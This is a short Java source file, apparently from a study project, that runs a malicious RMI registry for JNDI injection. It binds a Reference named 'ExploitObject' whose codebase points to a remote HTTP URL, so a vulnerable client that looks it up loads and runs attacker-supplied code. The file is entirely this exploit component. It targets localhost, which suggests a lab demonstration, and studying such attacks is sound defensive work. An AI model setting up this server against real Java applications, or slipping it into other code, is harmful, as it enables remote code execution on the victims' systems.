package com.yintp.jndi.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

/**
 * @author yintp
 */
public class JndiRmiRefServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 实例化一个Reference尝试为远程对象构造一个引用
        Reference reference = new Reference("ExploitObject", "ExploitObject", "http://127.0.0.1:8080/test");
        // 强转成ReferenceWrapper，因为Reference并没有继承Remote接口，不能直接注册到Registry中
        registry.bind("yintp", new ReferenceWrapper(reference));
        // 打印别名
        System.out.println("Registry List: " + Arrays.toString(registry.list()));
    }
}
